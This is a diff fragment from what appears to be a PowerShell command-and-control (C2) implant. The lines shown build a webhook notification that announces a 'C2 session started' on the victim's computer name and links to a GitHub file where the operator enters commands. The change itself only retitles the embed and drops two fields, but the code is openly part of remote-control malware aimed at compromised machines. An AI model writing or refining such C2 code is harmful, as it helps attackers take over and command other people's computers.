@@ -84,12 +84,10 @@ $previouscmd = $response
 $noraw = $ghurl -replace "/raw", ""
 $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
 $jsonPayload = @{
-    content    = " $env:COMPUTERNAME C2 session started!"
-    avatar_url = "https://i.ibb.co/vJh2LDp/img.png"
     tts        = $false
     embeds     = @(
         @{
-            title       = "$env:COMPUTERNAME C2 session started!"
+            title       = "$env:COMPUTERNAME | C2 session started!"
             description = ":link: ``Enter Commands Here`` - $noraw :link:"
             color       = 16711680
             author      = @{
